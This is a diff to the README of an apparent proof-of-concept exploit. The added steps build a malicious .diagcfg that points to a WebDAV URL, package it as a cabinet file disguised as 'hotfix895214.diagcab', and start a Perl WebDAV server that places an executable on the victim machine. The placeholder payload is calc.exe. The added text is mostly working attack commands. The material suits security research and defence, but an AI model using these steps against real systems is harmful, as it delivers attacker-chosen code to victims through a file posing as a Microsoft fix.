@@ -43,6 +43,27 @@ So, basically what we need is:
 
 ### 🔨 Craft the  `.diagcab` file
 
+* `.diagcfg` are simple XML files that hold reference to one or more diagnostic packages and provide meta information about them
+* They are packaged into Microsoft cabinet file archives and saved with `.diagcab` extension.
+
+Firt build `custom.diagcfg`:
+```shell
+./build-malicious-diagcfg.sh --url [WEBDAV_URL]
+```
+
+And build the `hotfix895214.diagcab`:
+```shell
+cabarc.exe n hotfix895214.diagcab custom.diagcfg
+# run it on windows (or with wine). If you do not find carbarc.exe use http://jc.bellamy.free.fr/download/cabarc.exe or http://download.microsoft.com/download/platformsdk/cab/2.0/w98nt42kmexp/en-us/Cabsdk.exe
+```
+
 ### 🏗️ Set up the server
+
+Put the executable you want to transfer on victim machine within `./webdav/malicious` folder... *(Here use the classic `calc.exe`)*
+
+...And launch the server:
+```
+perl diagcab-webdav-poc.pl
+```
 
 ### 👁️ Wait and see...
